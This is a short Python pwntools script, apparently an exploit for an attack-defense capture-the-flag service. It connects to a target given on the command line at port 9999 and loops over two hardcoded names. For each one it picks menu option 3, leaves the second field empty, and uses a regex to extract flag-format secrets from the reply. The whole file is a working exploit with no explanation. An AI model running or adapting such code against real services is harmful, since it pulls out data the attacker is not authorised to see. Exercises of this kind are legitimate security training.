from pwn import *
import re

attack_data = ['5NMr5zduzHnlfRXS2nBO', '8x7iyUhmrFqTKygRYDTI']

if __name__ == "__main__":

    r = remote(sys.argv[1], 9999)

    for ass_name in attack_data:
        r.recvuntil(b"> ")
        r.sendline(b"3")
        
        r.recvuntil(b": ")
        r.sendline(ass_name.encode())

        r.recvuntil(b": ")
        r.sendline("")

        print(re.findall(b"[A-Z0-9]{31}=", r.recvline()))
    
    r.recvuntil(b"> ")
    r.sendline(b"6")
    r.close()